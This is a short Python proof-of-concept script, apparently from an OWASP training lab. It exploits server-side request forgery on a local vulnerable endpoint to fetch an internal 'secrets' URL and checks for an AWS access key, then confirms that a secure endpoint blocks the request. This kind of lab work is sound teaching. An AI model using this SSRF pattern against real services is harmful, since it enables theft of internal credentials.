#!/usr/bin/env python3
"""
Proof-of-Concept (PoC): Server-Side Request Forgery (SSRF - A10:2021) Exploitation

Demonstrates how an attacker forces the server to fetch internal resources.
"""

import requests

BASE_URL = "http://127.0.0.1:8000/api/a10-ssrf"

def test_vulnerable_ssrf():
    print("[*] Testing VULNERABLE SSRF endpoint...")
    target_internal_url = "http://127.0.0.1:8000/api/a05-misconfig/vulnerable/secrets"
    url = f"{BASE_URL}/vulnerable?target_url={target_internal_url}"
    
    resp = requests.get(url)
    print(f"    Invoked URL: {url}")
    print(f"    Status Code: {resp.status_code}")
    if resp.status_code == 200 and "aws_access_key" in resp.text:
        print("[🔴 VULNERABILITY CONFIRMED] Server executed HTTP GET request to internal localhost API.")

def test_secure_ssrf():
    print("\n[*] Testing SECURE SSRF endpoint...")
    target_internal_url = "http://127.0.0.1:8000/api/a05-misconfig/vulnerable/secrets"
    url = f"{BASE_URL}/secure?target_url={target_internal_url}"
    
    resp = requests.get(url)
    print(f"    Invoked URL: {url}")
    print(f"    Status Code: {resp.status_code}")
    if resp.status_code == 403:
        print("[🟢 PROTECTED] Server blocked outgoing request to internal loopback IP (127.0.0.1).")

if __name__ == "__main__":
    test_vulnerable_ssrf()
    test_secure_ssrf()
